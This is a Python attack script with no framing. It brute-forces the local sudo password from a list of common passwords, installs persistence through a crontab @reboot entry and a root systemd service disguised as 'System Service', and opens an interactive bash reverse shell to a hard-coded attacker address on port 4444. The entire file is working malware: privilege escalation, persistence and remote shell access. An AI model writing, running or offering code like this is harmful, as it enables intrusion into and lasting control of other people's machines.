import os
import subprocess
import socket
import time
import sys
import threading
from itertools import product

def check_sudo():
    return os.geteuid() == 0

def brute_force_sudo():
    print("Starting sudo password brute force...")
    
    common_bases = [
        "", "password", "pass", "123", "1234", "12345", "123456", "1234567", "12345678",
        "admin", "root", "toor", "user", "test", "guest", "default", "changeme",
        "qwerty", "letmein", "welcome", "login", "secret", "master"
    ]
    
    common_suffixes = [
        "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "12", "123", "1234", "23", "321", "2023", "2024", "2025",
        "!", "@", "#", "$", "%", "^", "&", "*", "()", "!@#"
    ]
    
    for base, suffix in product(common_bases, common_suffixes):
        password = base + suffix
        if not password:
            continue
            
        try:
            result = subprocess.run(['sudo', '-S', 'true'],
                                  input=password+'\n', 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=3)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Found sudo password: {password}")
                return password
            else:
                print(f"[FAILED] {password}")
                
        except subprocess.TimeoutExpired:
            continue
        except Exception:
            continue
    
    print("Trying dictionary words...")
    dictionary_words = [
        "password", "admin", "root", "user", "test", "guest", "default",
        "changeme", "qwerty", "letmein", "welcome", "login", "secret",
        "master", "oracle", "mysql", "postgres", "apache", "nginx"
    ]
    
    for word in dictionary_words:
        try:
            result = subprocess.run(['sudo', '-S', 'true'], 
                                  input=word+'\n', 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=3)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Found sudo password: {word}")
                return word
                
        except:
            continue
        
        variations = [
            word.capitalize(),
            word.upper(),
            word + "1",
            word + "123",
            word + "!",
            word + "@",
            "1" + word,
            "123" + word
        ]
        
        for var in variations:
            try:
                result = subprocess.run(['sudo', '-S', 'true'], 
                                      input=var+'\n', 
                                      capture_output=True, 
                                      text=True, 
                                      timeout=3)
                
                if result.returncode == 0:
                    print(f"[SUCCESS] Found sudo password: {var}")
                    return var
                    
            except:
                continue
    
    print("Brute force failed - no valid password found")
    return None

def establish_reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        s.send(b"Reverse shell established with root privileges!\n")
        
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception as e:
        print(f"Failed to establish reverse shell: {e}")
        sys.exit(1)

def setup_persistence():
    cron_job = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
    subprocess.run(['crontab', '-'], input=cron_job, text=True)
    
    service_content = f"""
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
    with open('/etc/systemd/system/system-service.service', 'w') as f:
        f.write(service_content)
    subprocess.run(['systemctl', 'enable', 'system-service.service'])

def main():
    setup_persistence()
    
    LISTENER_HOST = "192.168.1.100"  # attacker IP address
    LISTENER_PORT = 4444             # listening port
    
    if not check_sudo():
        print("Not running as root, attempting privilege escalation...")
        
        sudo_pwd = brute_force_sudo()
        
        if sudo_pwd:
            print(f"Password found: {sudo_pwd}")
            try:
                subprocess.run(['sudo', '-S', sys.executable] + sys.argv, 
                             input=sudo_pwd+'\n', 
                             check=True)
                return
            except subprocess.CalledProcessError:
                print("Failed to escalate privileges with found password")
                sys.exit(1)
        else:
            print("Could not crack sudo password")
            sys.exit(1)
    
    print("Running with elevated privileges...")
    print(f"Establishing reverse shell to {LISTENER_HOST}:{LISTENER_PORT}")
    
    establish_reverse_shell(LISTENER_HOST, LISTENER_PORT)

if __name__ == "__main__":
    main()